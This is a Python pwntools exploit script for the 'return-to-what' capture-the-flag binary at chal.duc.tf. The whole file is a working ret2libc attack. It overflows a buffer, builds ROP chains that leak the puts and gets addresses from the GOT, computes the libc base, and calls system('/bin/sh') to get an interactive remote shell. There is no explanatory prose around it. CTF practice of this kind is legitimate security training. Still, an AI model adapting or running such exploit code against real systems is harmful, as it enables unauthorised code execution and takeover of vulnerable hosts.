from pwn import *

local = False

host, port = 'chal.duc.tf', 30003
binary = './return-to-what'
elf = ELF(binary)

if local:
    p = process(binary)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    p = remote(host, port)
    libc = ELF('libc6_2.27-3ubuntu1_amd64.so')

def debug(bps):
    gdbscript = ''
    for bp in bps:
        gdbscript += 'b *0x{:x}'.format(bp)
    gdb.attach(p, gdbscript=gdbscript)
#debug([0x00000000004011ac])


p.recvuntil('Where would you like to return to?')
padding = b'A'*56

# leaking puts address
puts_plt = elf.symbols['puts']
main_plt = elf.symbols['main']
puts_got = elf.got['puts']
pop_rdi = 0x000000000040122b

log.info('puts_plt addr = ' + hex(puts_plt))
log.info('main addr     = ' + hex(main_plt))
log.info('puts_got addr = ' + hex(puts_got))
log.info('pop_rdi  addr = ' + hex(pop_rdi))

# making rop payload
rop_1 = padding + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_plt)
p.sendline(rop_1)

# extracting puts leaked address
p.recvline() # receives newline
puts_leaked = p.recvline().strip() # receives puts addresss
puts_leaked = u64(puts_leaked.ljust(8, b'\x00'))
log.info('leaked puts is ' + hex(puts_leaked))

p.recvuntil('Where would you like to return to?')

# leaking gets address
gets_got = elf.got['gets']

# making rop payload
rop_2 = padding + p64(pop_rdi) + p64(gets_got) + p64(puts_plt) + p64(main_plt) + p64(pop_rdi) + p64(gets_got) + p64(puts_plt) + p64(main_plt)
p.sendline(rop_2)

# extracting gets leaked address
p.recvline() # receives newline
gets_leaked = p.recvline().strip() # receives gets addresss
gets_leaked = u64(gets_leaked.ljust(8, b'\x00'))
log.info('leaked gets is ' + hex(gets_leaked))

p.recvuntil('Where would you like to return to?')

# find which libc is used on the server, with libc database at https://libc.rip, and download it
# libc6_2.27-3ubuntu1_amd64.so

# calculate libc base address
puts_libc = libc.symbols['puts']
libc.address = puts_leaked - puts_libc

# finding system and '/bin/sh'
system_addr = libc.symbols['system']
bin_sh_addr = next(libc.search(b'/bin/sh'))
log.info('system addr  = ' + hex(system_addr))
log.info('/bin/sh addr = ' + hex(bin_sh_addr))

# making rop payload
rop_3 = padding + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr) + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr) 
p.sendline(rop_3)

p.interactive()
